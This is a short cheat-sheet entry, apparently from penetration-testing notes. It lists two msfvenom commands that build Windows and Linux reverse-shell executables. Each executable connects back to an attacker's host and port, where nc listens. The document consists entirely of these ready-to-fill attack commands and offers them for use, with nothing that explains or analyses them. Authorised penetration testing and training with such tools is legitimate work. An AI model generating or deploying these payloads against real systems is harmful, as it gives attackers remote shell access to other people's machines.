# msfvenom
#target/local #os/linux #cat/utils

## Windows reverse shell payload for nc
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport|9001> -f <format|exe> > shell.<format>
```

## Linux reverse shell payload for nc
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport|9001> -f <format|elf> -o shell.<format>
```
